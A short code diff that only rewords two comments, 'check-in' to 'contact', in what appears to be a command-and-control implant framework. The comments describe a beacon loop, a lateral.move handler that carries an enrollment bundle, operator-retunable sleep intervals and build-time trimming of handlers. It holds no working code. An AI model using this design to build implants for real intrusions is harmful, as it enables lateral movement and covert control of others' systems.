@@ -8,7 +8,7 @@ namespace Rod.Implant.Internal;
 // so the dev tree runs the full set from flags/env; the bake replaces it with
 // a generated selection naming only the handlers the build class's verb set
 // keeps, and deletes the unused handler sources from the compilation whole --
-// the same replace-a-stub trim TransportSelection applies to the check-in
+// the same replace-a-stub trim TransportSelection applies to the contact
 // clients. HandlerRegistry.Default builds its lists from here, so the beacon
 // loop wires whatever selection the artifact carries without an edit.
 
@@ -21,7 +21,7 @@ internal static class HandlerSelection
     /// lateral.move handler carrying the <paramref name="enroll"/> bundle
     /// when child derivation is enabled, and beacon.sleep carrying the live
     /// <paramref name="cadence"/> so an operator can retune a fielded
-    /// implant's check-in interval. The channel verbs also register a
+    /// implant's contact interval. The channel verbs also register a
     /// one-shot fallback so the verb stays dispatchable everywhere the
     /// registry is used: a path with no channel to carry it (a poll cycle,
     /// a future transport without streams) fails cleanly at the verb
